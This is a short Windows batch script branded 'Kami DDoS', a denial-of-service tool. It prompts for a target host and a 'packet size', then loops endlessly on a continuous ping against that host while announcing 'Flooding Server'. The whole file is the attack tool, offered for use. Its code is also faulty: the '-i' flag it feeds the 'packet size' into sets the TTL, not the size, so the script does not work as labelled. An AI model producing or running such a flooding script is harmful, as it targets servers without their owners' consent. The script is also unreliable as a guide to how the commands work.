@echo off
mode 67,16
title Kami DDoS
color 0
cls
echo.
echo �����������������������������������������������������������������
echo Welcome to Kami DDoS
echo �����������������������������������������������������������������
echo.
set /p x=Target:
echo.
echo �����������������������������������������������������������������
ping %x%
echo �����������������������������������������������������������������
@ping.exe 127.0.0.1 -n 5 -w 1000 > nul
goto Next
:Next
echo.
echo.
echo.
set /p m=Ip Host:
echo.
set /p n=Packet Size:
echo.
:DDOS
color 0c
echo Flooding Server %m%...
ping %m% -i %n% -t >nul
goto DDOS